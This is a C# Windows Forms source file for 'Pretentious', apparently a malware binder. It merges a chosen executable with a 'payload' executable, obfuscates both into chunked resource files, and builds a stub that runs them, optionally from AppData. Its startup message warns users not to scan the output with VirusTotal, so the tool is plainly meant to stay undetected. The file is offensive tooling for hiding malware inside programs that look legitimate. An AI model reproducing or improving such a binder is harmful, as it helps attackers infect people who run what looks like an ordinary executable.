using System;
using System.IO;
using System.Text;
using System.Resources;
using System.Windows.Forms;
using System.ComponentModel;
using Pretentious.Core;
using Pretentious.Components;

namespace Pretentious
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        private void Main_Load(object sender, EventArgs e)
        {
            Directory.CreateDirectory("res");

            StringBuilder message = new StringBuilder();
            message.Append("--> Pretentious 1.0.0\n");
            message.Append("==============================================\n");
            message.Append("--> Welcome. Do not scan with virus total.\n");
            message.Append("--> If your target file has DLL dependencies\n");
            message.Append("--> change the start path text field to empty OR\n");
            message.Append("--> 'FolderName\\' and place all dlls in that directory.\n");
            message.Append("==============================================\n");
            message.Append("--> Developer: Donkey Death Jam\n");
            MessageBox.Show(message.ToString(), "Pretentious", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void SelectButton_Click(object sender, EventArgs e)
        {
            OpenFileDIAG.FileOk += OpenFileDIAG_FileOk;
            OpenFileDIAG.Filter = "Executable Files|*.exe";
            OpenFileDIAG.ShowDialog();
        }

        private void OpenFileDIAG_FileOk(object sender, CancelEventArgs e)
        {
            FilePathText.Text = OpenFileDIAG.FileName;
        }

        private void BuildButton_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(FilePathText.Text) || string.IsNullOrEmpty(PayloadText.Text))
            {
                MessageBox.Show("Error! You did not select files to bind.", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            SaveFileDIAG.Filter = "Executable Files|*.exe";
            if (SaveFileDIAG.ShowDialog() != DialogResult.OK)
                return;

            if (!File.Exists(FilePathText.Text) || !File.Exists(PayloadText.Text))
            {
                MessageBox.Show("Error! Selected files were deleted.", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string outputPath = SaveFileDIAG.FileName;
            string buildSource = Properties.Resources.build_source;

            if (StartPathText.Text.ToLower() == "{appdata}")
                buildSource = buildSource.Replace("[USEAPP]", "true");
            else
            {
                buildSource = buildSource.Replace("[USEAPP]", "false");
                buildSource = buildSource.Replace("[PATH]", StartPathText.Text);
            }

            string[] resourcesFile = GenerateData(FilePathText.Text, "pretentious");
            string[] resourcesPayload = GenerateData(PayloadText.Text, "pretent");

            StubBuilder.Build(outputPath, buildSource, resourcesFile, resourcesPayload);
            MessageBox.Show("Successfully binded! Saved to: " + outputPath, "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private string[] GenerateData(string path, string name)
        {
            byte[] targetFile = File.ReadAllBytes(path);
            string fileBase64 = Convert.ToBase64String(targetFile);
            BrunoShifter.Initialize();
            string brunoFile = BrunoShifter.Bruno(fileBase64);

            CherryBox cherryBox = new CherryBox();
            cherryBox.Initialize(1000);
            cherryBox.SeparateElements(brunoFile);
            string[] dataParts = cherryBox.GetItems();
            string[] resources = new string[dataParts.Length];

            for (int i = 0; i < dataParts.Length; i++)
            {
                string resourceFile = Path.Combine("res\\", name + i + ".resources");
                using (ResourceWriter resourceWriter = new ResourceWriter(resourceFile))
                {
                    resourceWriter.AddResource("cherry", dataParts[i]);
                    resourceWriter.Generate();
                }
                resources[i] = resourceFile;
            }

            return resources;
        }

        private void SelectPayloadButton_Click(object sender, EventArgs e)
        {
            PayloadDIAG.FileOk += PayloadDIAG_FileOk;
            PayloadDIAG.Filter = "Executable Files|*.exe";
            PayloadDIAG.ShowDialog();
        }

        private void PayloadDIAG_FileOk(object sender, CancelEventArgs e)
        {
            PayloadText.Text = PayloadDIAG.FileName;
        }
    }
}